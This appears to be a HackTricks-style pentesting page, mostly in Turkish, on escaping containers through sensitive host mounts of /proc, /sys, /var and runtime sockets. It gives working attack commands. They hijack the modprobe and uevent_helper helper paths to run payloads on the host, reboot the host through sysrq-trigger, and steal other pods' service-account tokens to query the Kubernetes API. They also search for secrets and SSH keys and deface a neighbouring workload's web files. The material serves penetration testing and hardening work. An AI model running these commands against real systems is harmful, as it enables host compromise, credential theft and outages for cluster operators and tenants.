# Hassas Host Mounts

{{#include ../../../banners/hacktricks-training.md}}

## Genel Bakış

Host mounts, sıklıkla dikkatle izole edilmiş bir işlem görünümünü yeniden host kaynaklarının doğrudan görünürlüğüne indirdikleri için en önemli pratik container-escape yüzeylerinden biridir. Tehlikeli durumlar sadece `/` ile sınırlı değildir. `/proc`, `/sys`, `/var` gibi bind mounts, runtime sockets, kubelet-managed state veya device-related paths kernel kontrollerini, kimlik bilgilerini, komşu container dosya sistemlerini ve runtime yönetim arayüzlerini açığa çıkarabilir.

Bu sayfa bireysel koruma sayfalarından ayrı olarak bulunur çünkü kötüye kullanım modeli çapraz kesitlidir. A writable host mount, kısmen mount namespaces, kısmen user namespaces, kısmen AppArmor veya SELinux kapsamı ve kısmen de hangi host yolunun açığa çıktığı yüzünden tehlikelidir. Bunu kendi konusu olarak ele almak saldırı yüzeyini değerlendirmeyi çok daha kolay hale getirir.

## `/proc` Açığa Çıkması

procfs hem sıradan işlem bilgilerini hem de yüksek etkili kernel kontrol arayüzlerini içerir. `-v /proc:/host/proc` gibi bir bind mount veya beklenmedik yazılabilir proc girdilerini açığa çıkaran bir container görünümü bu nedenle bilgi sızdırma, hizmet reddi veya doğrudan host kodu yürütülmesine yol açabilir.

High-value procfs paths include:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Kötüye Kullanım

İlk olarak hangi yüksek değerli procfs girdilerinin görünür veya yazılabilir olduğunu kontrol edin:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
Bu yollar farklı nedenlerle ilgi çekicidir. `core_pattern`, `modprobe` ve `binfmt_misc` yazılabilir olduğunda host code-execution yolları haline gelebilir. `kallsyms`, `kmsg`, `kcore` ve `config.gz` kernel exploitation için güçlü reconnaissance kaynaklarıdır. `sched_debug` ve `mountinfo`, process, cgroup ve filesystem bağlamını ortaya çıkarır; bu bilgiler container içinden host düzeninin yeniden oluşturulmasına yardımcı olabilir.

Her yolun pratik değeri farklıdır ve hepsini aynı etkiye sahipmiş gibi değerlendirmek triage'ı zorlaştırır:

- `/proc/sys/kernel/core_pattern`
Eğer yazılabilirse, kernel bir crash sonrası bir pipe handler çalıştıracağı için bu procfs yollarından en yüksek etkiye sahip olanlardan biridir. `core_pattern`'i overlay'inde veya mount edilmiş bir host yolunda depolanan bir payload'a yönlendirebilen bir container genellikle host kod yürütmesi elde edebilir. Özel bir örnek için bkz. [read-only-paths.md](protections/read-only-paths.md).
- `/proc/sys/kernel/modprobe`
Bu yol, kernel'in module-loading mantığını çalıştırması gerektiğinde kullandığı userspace helper'ı kontrol eder. Eğer container'dan yazılabiliyor ve host bağlamında yorumlanıyorsa, başka bir host code-execution primitive'i haline gelebilir. Özellikle helper yolunu tetiklemenin bir yolu ile birleştirildiğinde ilgi çekicidir.
- `/proc/sys/vm/panic_on_oom`
Genelde temiz bir escape primitive'i değildir, ancak bellek baskısını OOM koşullarını kernel panic davranışına çevirerek host-genel bir denial-of-service'e dönüştürebilir.
- `/proc/sys/fs/binfmt_misc`
Kayıt arayüzü yazılabiliyorsa, saldırgan seçilen bir magic value için bir handler kaydedebilir ve eşleşen bir dosya çalıştırıldığında host-context execution elde edebilir.
- `/proc/config.gz`
kernel exploit triage için faydalıdır. Hangi subsystem'ların, mitigations'ın ve opsiyonel kernel özelliklerinin etkin olduğunu host package metadata'sına ihtiyaç duymadan belirlemeye yardımcı olur.
- `/proc/sysrq-trigger`
Çoğunlukla denial-of-service yolu olsa da çok ciddi bir yoldur. Host'u hemen reboot, panic veya başka şekilde bozabilir.
- `/proc/kmsg`
Kernel ring buffer mesajlarını ortaya çıkarır. Host fingerprinting, crash analysis için faydalıdır ve bazı ortamlarda kernel exploitation'a yardımcı olacak bilgilerin leaking edilmesine neden olabilir.
- `/proc/kallsyms`
Okunabiliyorsa değerlidir; exported kernel symbol information'ı açığa çıkarır ve kernel exploit development sırasında address randomization varsayımlarını kırmaya yardımcı olabilir.
- `/proc/[pid]/mem`
Bu doğrudan bir process-memory arayüzüdür. Hedef process gerekli ptrace-style koşullarla erişilebiliyorsa, başka bir process'in hafızasını okumaya veya değiştirmeye izin verebilir. Gerçekçi etki büyük ölçüde credentials, `hidepid`, Yama ve ptrace kısıtlamalarına bağlıdır; bu yüzden güçlü ama koşullu bir yoldur.
- `/proc/kcore`
Sistem belleğinin core-image-style görüntüsünü açar. Dosya çok büyük ve kullanması zor olsa da, anlamlı şekilde okunabiliyorsa host belleğinin kötü bir şekilde açığa çıktığını gösterir.
- `/proc/kmem` and `/proc/mem`
Tarihsel olarak yüksek etkiye sahip raw memory arayüzleri. Birçok modern sistemde devre dışı bırakılmış veya güçlü şekilde kısıtlanmış olsa da, mevcut ve kullanılabilirlerse kritik bulgular olarak ele alınmalıdır.
- `/proc/sched_debug`
Leaks scheduling ve task bilgilerini açığa çıkarır; bu, diğer process görünümleri beklenenden daha temiz görünse bile host process kimliklerini ortaya çıkarabilir.
- `/proc/[pid]/mountinfo`
Container'ın gerçekte host üzerinde nerede bulunduğunu, hangi yolların overlay-backed olduğunu ve yazılabilir bir mount'un host içeriğine mi yoksa sadece container layer'ına mı karşılık geldiğini yeniden inşa etmek için son derece kullanışlıdır.

Eğer `/proc/[pid]/mountinfo` veya overlay detayları okunabiliyorsa, bunları container filesystem'inin host path'ini geri almak için kullanın:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
Bu komutlar kullanışlıdır çünkü bir dizi host-execution tricks, container içindeki bir path'i host'un bakış açısından karşılık gelen path'e dönüştürmeyi gerektirir.

### Tam Örnek: `modprobe` Helper Path Abuse

Eğer `/proc/sys/kernel/modprobe` container'dan yazılabiliyorsa ve helper path host context içinde yorumlanıyorsa, bir attacker-controlled payload'a yönlendirilebilir:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
Tam tetikleyici hedefe ve kernel davranışına bağlıdır, ancak önemli nokta, yazılabilir bir helper yolunun gelecekteki bir kernel helper çağrısını saldırganın kontrolündeki host-path içeriğine yönlendirebilmesidir.

### Tam Örnek: Kernel Recon With `kallsyms`, `kmsg`, And `config.gz`

Eğer amaç doğrudan hemen kaçıştan ziyade istismar edilebilirlik değerlendirmesi ise:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
Bu komutlar, yararlı sembol bilgisinin görünür olup olmadığını, son kernel mesajlarının ilginç bir durum açığa çıkarıp çıkarmadığını ve hangi kernel özelliklerinin veya mitigations'ın derlenmiş olduğunu belirlemeye yardımcı olur. Etki genellikle doğrudan escape değildir, ancak kernel-vulnerability triage sürecini ciddi şekilde kısaltabilir.

### Tam Örnek: SysRq Host Yeniden Başlatma

Eğer `/proc/sysrq-trigger` yazılabilir ve host görünümüne ulaşıyorsa:
```bash
echo b > /proc/sysrq-trigger
```
Etkisi, host'un derhal yeniden başlatılmasıdır. Bu ince bir örnek değil, ama procfs maruziyetinin bilgi ifşasından çok daha ciddi olabileceğini açıkça gösteriyor.

## `/sys` Maruziyeti

sysfs, çekirdek ve cihaz durumuyla ilgili çok fazla bilgi açığa çıkarır. Bazı sysfs yolları esas olarak fingerprinting için yararlıdır, diğerleri ise helper yürütmesini, cihaz davranışını, security-module yapılandırmasını veya firmware durumunu etkileyebilir.

Yüksek değerli sysfs yolları şunlardır:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Bu yollar farklı nedenlerle önemlidir. `/sys/class/thermal`, termal yönetim davranışını etkileyebilir ve bu nedenle kötü şekilde açığa çıkmış ortamlarda host kararlılığını etkileyebilir. `/sys/kernel/vmcoreinfo` crash-dump ve kernel-layout bilgilerini leak edebilir; bu, düşük seviyeli host fingerprinting'e yardımcı olur. `/sys/kernel/security`, Linux Security Modules tarafından kullanılan `securityfs` arabirimidir; bu nedenle oradaki beklenmeyen erişim MAC ile ilgili durumu açığa çıkarabilir veya değiştirebilir. EFI variable yolları, firmware destekli önyükleme ayarlarını etkileyebilir; bu da onları sıradan yapılandırma dosyalarından çok daha ciddi hale getirir. `/sys/kernel/debug` altındaki `debugfs` özellikle tehlikelidir çünkü bilerek geliştirici odaklı bir arabirimdir ve sertleştirilmiş üretim odaklı kernel API'lerine göre çok daha az güvenlik beklentisine sahiptir.

Bu yolları incelemek için faydalı komutlar şunlardır:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
What makes those commands interesting:

- `/sys/kernel/security` AppArmor, SELinux veya başka bir LSM arayüzünün host'a özel kalması gereken şekilde görünür olup olmadığını ortaya çıkarabilir.
- `/sys/kernel/debug` genellikle bu grubun en endişe verici bulgusudur. Eğer `debugfs` mount edilmiş ve okunabilir veya yazılabilirse, etkin debug node'larına bağlı olarak riski değişen kernel'e yönelik geniş bir yüzey beklenir.
- EFI değişkenlerinin açığa çıkması daha az yaygındır, ancak mevcutsa yüksek etkili olur çünkü sıradan çalışma zamanı dosyaları yerine firmware destekli ayarları etkiler.
- `/sys/class/thermal` esas olarak host kararlılığı ve donanım etkileşimi ile ilgilidir, şık bir shell-tarzı kaçış için değil.
- `/sys/kernel/vmcoreinfo` esasen host parmakizi çıkarma ve çökme analizi kaynağıdır; düşük seviyeli kernel durumunu anlamada faydalıdır.

### Tam Örnek: `uevent_helper`

Eğer `/sys/kernel/uevent_helper` yazılabilirse, kernel bir `uevent` tetiklendiğinde saldırgan kontrollü bir helper çalıştırabilir:
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
The reason this works is that the helper path is interpreted from the host's point of view. Once triggered, the helper runs in the host context rather than inside the current container.

## `/var` Açığa Çıkması

Host'un `/var` dizinini bir container'a mount etmek genellikle küçümsenir çünkü `/` mount etmek kadar dramatik görünmez. Pratikte bu, runtime soketlerine, container snapshot dizinlerine, kubelet tarafından yönetilen pod hacimlerine, projected service-account token'larına ve komşu uygulama dosya sistemlerine erişmek için yeterli olabilir. Modern node'larda, `/var` genellikle en operasyonel açıdan ilginç container durumlarının gerçekten bulunduğu yerdir.

### Kubernetes Örneği

Bir pod `hostPath: /var` ile genellikle diğer pod'ların projected token'larını ve overlay snapshot içeriğini okuyabilir:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Bu komutlar, mount'un yalnızca önemsiz uygulama verilerini mi yoksa yüksek etkili cluster credentials mi açığa çıkardığını yanıtladıkları için faydalıdır. Okunabilir bir service-account token, local code execution'ı hemen Kubernetes API erişimine dönüştürebilir.

Token mevcutsa, token keşfinde durmak yerine nereye erişebileceğini doğrulayın:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
Buradaki etki yerel node erişiminden çok daha büyük olabilir. Geniş RBAC yetkisine sahip bir token, mount edilmiş `/var`'ı tüm cluster'ın ele geçirilmesine yol açacak şekilde kötüye kullanabilir.

### Docker ve containerd Örneği

Docker host'larında ilgili veriler genellikle `/var/lib/docker` altında bulunur; containerd destekli Kubernetes node'larında ise `/var/lib/containerd` veya snapshotter-özel yollar altında olabilir:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
Bağlı `/var` başka bir iş yükünün yazılabilir snapshot içeriğini açığa çıkarıyorsa, saldırgan mevcut container yapılandırmasına dokunmadan uygulama dosyalarını değiştirebilir, web içeriği yerleştirebilir veya başlangıç betiklerini değiştirebilir.

Yazılabilir snapshot içeriği bulunduğunda somut kötüye kullanım fikirleri:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
Bu komutlar yararlıdır çünkü bağlı `/var`'ın üç ana etki ailesini gösterir: application tampering, secret recovery ve lateral movement into neighboring workloads.

## Runtime Sockets

Hassas host mount'ları genellikle tam dizinler yerine runtime sockets içerir. Bunlar o kadar önemlidir ki burada açıkça tekrar edilmeyi hak ederler:
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
Bu soketlerden biri mount edildiğinde tam exploitation akışları için [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) sayfasına bakın.

Hızlı bir ilk etkileşim deseni:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
Eğer bunlardan biri başarılı olursa, "mounted socket"ten "start a more privileged sibling container"a giden yol genellikle herhangi bir kernel breakout yolundan çok daha kısadır.

## Mount ile İlgili CVE'ler

Host mount'ları ayrıca runtime zafiyetleriyle de kesişir. Önemli ve yakın zamanlı örnekler şunlardır:

- `CVE-2024-21626` in `runc`, where a leaked directory file descriptor could place the working directory on the host filesystem.
- `CVE-2024-23651` and `CVE-2024-23653` in BuildKit, where OverlayFS copy-up races could produce host-path writes during builds.
- `CVE-2024-1753` in Buildah and Podman build flows, where crafted bind mounts during build could expose `/` read-write.
- `CVE-2024-40635` in containerd, where a large `User` value could overflow into UID 0 behavior.

Bu CVE'ler burada önemlidir çünkü mount işlemlerinin yalnızca operator yapılandırmasıyla ilgili olmadığını gösterir. Runtime'in kendisi de mount-driven escape koşulları yaratabilir.

## Kontroller

En yüksek değerli mount açığa çıkarmalarını hızlıca bulmak için şu komutları kullanın:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
- Host root, `/proc`, `/sys`, `/var` ve runtime sockets hepsi yüksek öncelikli bulgulardır.
- Yazılabilir proc/sys girdileri genellikle mount'un güvenli bir container görünümü yerine host-genel kernel kontrollerini açığa çıkardığı anlamına gelir.
- Mount edilmiş `/var` yolları sadece dosya sistemi incelemesiyle sınırlı kalmamalı; kimlik bilgileri ve komşu iş yükleri de incelenmelidir.
